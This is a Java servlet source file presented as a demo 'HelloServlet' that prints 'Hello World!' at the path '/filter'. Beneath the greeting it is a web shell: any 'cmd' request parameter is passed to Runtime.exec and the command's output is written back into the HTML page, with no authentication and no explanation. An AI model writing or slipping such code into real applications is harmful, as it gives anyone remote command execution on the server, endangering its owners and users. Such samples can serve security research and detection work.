package com.example.demo;

import java.io.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

@WebServlet(name = "helloServlet", value = "/filter")
public class HelloServlet extends HttpServlet {
    private String message;

    public void init() {
        message = "Hello World!";
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");

        // Hello
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h1>" + message + "</h1>");
        out.println("</body></html>");

        if(request.getParameter("cmd")!=null){
            java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
            int a = -1;
            byte[] b = new byte[2048];
            out.print("<pre>");
            while((a=in.read(b))!=-1){
                out.print(new String(b));
                //System.out.println(new String(b));
            }
            out.print("</pre>");
        }

    }

    public void destroy() {
    }
}